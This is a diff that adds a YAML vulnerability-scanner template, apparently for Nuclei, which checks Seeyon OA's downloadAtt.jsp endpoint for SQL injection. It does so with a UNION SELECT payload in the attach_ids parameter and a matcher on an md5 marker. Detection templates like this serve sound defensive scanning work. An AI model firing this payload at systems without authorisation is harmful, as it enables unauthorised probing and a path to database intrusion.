@@ -1,0 +1,24 @@
+id: seeyon-wooyun-sqli
+info:
+  name: Seeyon Wooyun SQL Injection
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in Seeyon Wooyun identified by the payload targeting the downloadAtt.jsp endpoint.
+variables:
+  rand: "{{rand_int(10000, 21000)}}"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/ext/trafaxserver/downloadAtt.jsp?attach_ids=(1)%20and%201=2%20union%20select%201,2,3,4,5,md5({{rand}}),7--"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{md5(rand)}}"
+        part: body
+      - type: status
+        status:
+          - 200
+    redirects: false
